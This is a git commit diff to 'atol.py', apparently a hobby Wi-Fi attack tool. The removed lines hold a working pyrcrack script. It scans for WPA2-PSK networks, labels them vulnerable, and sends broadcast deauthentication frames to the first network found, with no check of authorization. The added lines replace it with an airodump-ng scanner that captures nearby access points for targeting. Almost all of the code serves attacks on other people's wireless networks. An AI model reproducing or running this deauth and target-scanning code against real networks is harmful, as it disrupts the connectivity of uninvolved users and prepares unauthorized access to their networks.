80849aa3d927e3c7bd15cf2791513a0ce336991b
gespel <heimbrodt@uni-potsdam.de>
2025-11-06 22:38:29 +0100

    i am writing this myself now

--- atol.py
+++ atol.py
@@ -1,62 +1,21 @@
-import asyncio
-
-import pyrcrack
-
-from rich.console import Console
-from rich.prompt import Prompt
+import subprocess
+import time
+import csv
 
 class Atol:
     def __init__(self):
-        self.vulnarable_networks = []
-        self.networks = []
+        pass
 
-    async def scan_for_targets(self, scan_time: int = 3) -> list:
-        out = []
-        airmon = pyrcrack.AirmonNg()
-        interfaces = await airmon.interfaces
-        print(interfaces[1])
-        interface = interfaces[1]
+    def scan_for_aps(self, interface="wlan1", scan_time=5):
+        prefix = "dump"
+        cmd = ["airodump-ng", "--write", prefix, "--output-format", "csv", interface]
+        process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
-        async with airmon(interface) as mon:
-            async with pyrcrack.AirodumpNg() as pdump:
-                counter = 0
-                async for result in pdump(mon.monitor_interface):
-                    #print(result)
-                    if counter >= 3:
-                        out = result
-                        break
-                    counter += 1
-                    await asyncio.sleep(1)
-        self.networks = out
-        return out
-    
-    async def deauthenticate_target(self, bssid: str, client: str, count: int = 5):
-        airmon = pyrcrack.AirmonNg()
-        interfaces = await airmon.interfaces
-        interface = interfaces[0]
+        time.sleep(scan_time)
 
-        async with airmon(interface) as mon:
-            async with pyrcrack.AireplayNg() as preplay:
-                async with preplay(mon.monitor_interface) as replay:
-                    await replay.deauth(bssid=bssid, client=client, count=count)
-    
-    def analyze_networks(self):
-        for n in self.networks:
-            if n["essid"] and n["encryption"] == "WPA+PSK/WPA+AES-CCM":
-                self.vulnarable_networks.append(n)
+        process.kill()
+        process.wait()
 
-    def get_wpa2_networks(self):
-        return self.vulnarable_networks
 
 a = Atol()
-c = Console()
-
-asyncio.run(a.scan_for_targets(10))
-a.analyze_networks()
-
-c.clear()
-networks = a.get_wpa2_networks()
-for n in networks:
-    print(n)
-
-asyncio.run(a.deauthenticate_target(bssid=networks[0]["bssid"], client="FF:FF:FF:FF:FF:FF", count=10))
+a.scan_for_aps()
